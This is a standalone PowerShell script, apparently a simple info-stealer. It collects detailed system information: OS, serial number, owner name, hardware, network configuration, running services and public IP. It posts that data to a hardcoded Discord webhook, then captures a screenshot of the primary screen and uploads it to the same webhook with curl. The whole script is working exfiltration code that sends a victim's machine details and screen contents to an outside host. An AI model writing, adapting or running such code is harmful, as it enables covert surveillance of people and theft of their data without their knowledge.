$WebhookUrl = "https://discord.com/api/webhooks/1209712252882780220/r-uiEntcPmYiYZo2b_q623mLz_4Z0sc0--_XoS5llj8w2dK3HdSyCU6miOrNvX8lwdNy"

$RAM = Get-WmiObject -Query "SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem"
$totalRAM = [math]::Round($RAM.TotalVisibleMemorySize/1MB, 2)
$freeRAM = [math]::Round($RAM.FreePhysicalMemory/1MB, 2)
$usedRAM = [math]::Round(($RAM.TotalVisibleMemorySize - $RAM.FreePhysicalMemory)/1MB, 2)
$OS = Get-WmiObject -class Win32_OperatingSystem
$OS_Name = $OS.Caption
$OS_InstallDate = $OS.ConvertToDateTime($OS.InstallDate)
$OS_LastBootUpTime = $OS.ConvertToDateTime($OS.LastBootUpTime)
$OS_Architecture = $OS.OSArchitecture
$OS_SystemDrive = $OS.SystemDrive
$OS_WindowsDirectory = $OS.WindowsDirectory
$OS_BuildNumber = $OS.BuildNumber
$OS_SerialNumber = $OS.SerialNumber
$OS_Version = $OS.Version
$OS_Manufacturer = $OS.Manufacturer
$CS = Get-WmiObject -class Win32_ComputerSystem
$CS_Name = $CS.Name
$CS_Owner = $CS.PrimaryOwnerName
$CPU = Get-WmiObject -class Win32_Processor
$CPU_Name = $CPU.Name
$CPU_Manufacturer = $CPU.Manufacturer
$CPU_MaxClockSpeed = $CPU.MaxClockSpeed / 1000
$CPU_Used = (Get-WmiObject win32_processor).LoadPercentage
$CPU_Free = 100 - $CPU_Used
$Disk = Get-WmiObject -class Win32_LogicalDisk -Filter "DeviceID='C:'"
$Disk_ID = $Disk.DeviceID
$Disk_TotalSpace = [math]::Round($Disk.Size/1GB, 2)
$Disk_FreeSpace = [math]::Round($Disk.FreeSpace/1GB, 2)
$Disk_UsedSpace = [math]::Round(($Disk.Size - $Disk.FreeSpace)/1GB, 2)
$systeminfo = Invoke-Expression "systeminfo"
$ipconfig = ipconfig
$driverquery = driverquery
$netstart = net start
$ip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/ip").Content

$infoprop = @{
    'RAM_total'= $totalRAM;
    'RAM_free'= $freeRAM;
    'RAM_used'= $usedRAM;
    'OS_Name'= $OS_Name;
    'OS_InstallDate'= $OS_InstallDate;
    'OS_LastBootUpTime'= $OS_LastBootUpTime;
    'OS_Architecture'= $OS_Architecture;
    'OS_SystemDrive'= $OS_SystemDrive;
    'OS_WindowsDirectory'= $OS_WindowsDirectory;
    'OS_BuildNumber'= $OS_BuildNumber;
    'OS_SerialNumber'= $OS_SerialNumber;
    'OS_Version'= $OS_Version;
    'OS_Manufacturer'= $OS_Manufacturer;
    'CS_Name'= $CS_Name;
    'CS_Owner'= $CS_Owner;
    'CPU_Name'= $CPU_Name;
    'CPU_Manufacturer'= $CPU_Manufacturer;
    'CPU_MaxClockSpeed'= $CPU_MaxClockSpeed;
    'CPU_Used'= $CPU_Used;
    'CPU_Free'= $CPU_Free;
    'Disk_ID'= $Disk_ID;
    'Disk_TotalSpace'= $Disk_TotalSpace;
    'Disk_FreeSpace'= $Disk_FreeSpace;
    'Disk_UsedSpace'= $Disk_UsedSpace;
    'systeminfo'= $systeminfo;
    'ipconfig'= $ipconfig;
    'driverquery'= $driverquery;
    'netstart'= $netstart;
    'IP' = $ip;
}


$jsonFilePath = "C:\Users\$env:USERNAME\Desktop\tempfile.json"
$infoJson = $infoprop | ConvertTo-Json -Depth 10
$infoJson | Out-File -FilePath $jsonFilePath -Encoding UTF8
$fileName = [System.IO.Path]::GetFileName($jsonFilePath)

$username = $env:USERNAME + " " + $ip
$content = 'This is a test message.'

$boundary = [Guid]::NewGuid().ToString()
$LF = "`r`n"

$fileContent = [System.IO.File]::ReadAllBytes($jsonFilePath)

$encodedText = [System.Text.Encoding]::UTF8.GetBytes(
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"username`"$LF$LF" +
    "$username$LF" +
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"content`"$LF$LF" +
    "$content$LF" +
    "--$boundary$LF" +
    "Content-Disposition: form-data; name=`"files[0]`"; filename=`"$fileName`"$LF" +
    "Content-Type: application/octet-stream$LF$LF"
)

$footer = [System.Text.Encoding]::UTF8.GetBytes("$LF--$boundary--$LF")

$bodyBytes = New-Object byte[] ($encodedText.Length + $fileContent.Length + $footer.Length)
[System.Array]::Copy($encodedText, 0, $bodyBytes, 0, $encodedText.Length)
[System.Array]::Copy($fileContent, 0, $bodyBytes, $encodedText.Length, $fileContent.Length)
[System.Array]::Copy($footer, 0, $bodyBytes, $encodedText.Length + $fileContent.Length, $footer.Length)

$response = Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes

$Path = "C:\Users\$env:USERNAME\Desktop"

function TakeScreenshot { 
    param([string]$FilePath)

    Add-Type -AssemblyName System.Windows.Forms
    $ScreenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $ScreenshotObject = New-Object System.Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
    $DrawingGraphics = [System.Drawing.Graphics]::FromImage($ScreenshotObject)
    $DrawingGraphics.CopyFromScreen($ScreenBounds.Location, [System.Drawing.Point]::Empty, $ScreenBounds.Size)
    $DrawingGraphics.Dispose()
    $ScreenshotObject.Save($FilePath)
    $ScreenshotObject.Dispose()
}

$Time = Get-Date
$Filename = "$($Time.Year)-$($Time.Month)-$($Time.Day)T$($Time.Hour)-$($Time.Minute)-$($Time.Second).png"
$FilePath = Join-Path -Path $Path -ChildPath $Filename
TakeScreenshot -FilePath $FilePath

if (-not ([string]::IsNullOrEmpty($FilePath))){
    curl.exe -F "file1=@$FilePath" $WebhookUrl
}
